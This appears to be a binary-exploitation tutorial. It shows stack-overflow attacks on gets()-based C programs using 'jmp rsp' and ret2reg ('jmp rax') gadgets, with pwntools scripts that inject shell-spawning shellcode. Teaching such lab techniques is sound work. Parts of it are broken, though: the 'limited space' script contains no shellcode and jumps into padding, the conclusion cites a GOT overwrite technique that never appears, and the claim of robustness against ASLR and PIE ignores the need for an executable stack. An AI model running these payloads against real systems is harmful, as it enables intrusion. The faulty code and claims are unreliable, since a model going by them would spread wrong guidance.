## Reliable Shellcode Exploitation

### Introduction
This document explains reliable shellcode exploitation techniques across different scenarios, **RSP manipulation**, and **ret2reg** for exploiting vulnerabilities in binaries.

### **RSP Manipulation (Shellcode with RSP)**

**Vulnerable Code Example:**
```c
#include <stdio.h>

int test = 0;

int main() {
    char input[100];

    puts("Get me with shellcode and RSP!");
    gets(input);

    if (test) {
        asm("jmp *%rsp");
        return 0;
    } else {
        return 0;
    }
}
```

Here, RSP can be manipulated, allowing us to pivot execution to shellcode directly placed in memory.

**Exploitation Process:**
1. Locate a `jmp rsp` gadget (typically using `ROPgadget`).
2. Overflow the buffer, setting up RSP to point to the shellcode.
3. Jump to the shellcode via `jmp rsp`.

**Exploitation Code:**
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

# Find a 'jmp rsp' gadget in the binary
jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = flat(
    'A' * 120,                # Padding
    jmp_rsp,                  # RSP points to shellcode
    asm(shellcraft.sh())      # Shellcode
)

p.sendlineafter('RSP!\n', payload)
p.interactive()
```

**Limited Space Exploit:**
If the buffer space is limited, adjust RSP using a small offset, then jump to the shellcode.

**Exploitation Code with Small Offset:**
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
    sub rsp, 128;  # Adjust RSP
    jmp rsp;
''')  # Use the calculated RSP offset

p.sendlineafter('RSP!\n', payload)
p.interactive()
```

---

### **ret2reg (Using Registers to Control Flow)**

In this method, we target functions like `gets()` that return a pointer, and we exploit this by jumping to the address stored in a register, such as `RAX`. The reason RAX is the most common for this technique is that, by convention, the return value of a function is stored in RAX. For example, take the following basic code:

**Vulnerable Code Example:**
```c
#include <stdio.h>

void vuln() {
    char buffer[100];
    gets(buffer);
}

int main() {
    vuln();
    return 0;
}
```

**Analysis:**
1. The `gets()` function stores the buffer's address in `RAX`.
2. We search for a `jmp rax` gadget to jump to the shellcode stored at `RAX`.

**Exploitation Code:**
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

JMP_RAX = 0x40109c  # Found 'jmp rax' gadget address

payload = asm(shellcraft.sh())  # Shellcode
payload = payload.ljust(120, b'A')  # Padding
payload += p64(JMP_RAX)  # Jump to RAX (points to our shellcode)

p.sendline(payload)
p.interactive()
```

---

### **Conclusion**

These methods showcase various reliable ways of exploiting vulnerable binaries. Techniques like GOT overwrite, RSP manipulation, and ret2reg offer robust exploitation strategies even in the face of defenses like ASLR and PIE.
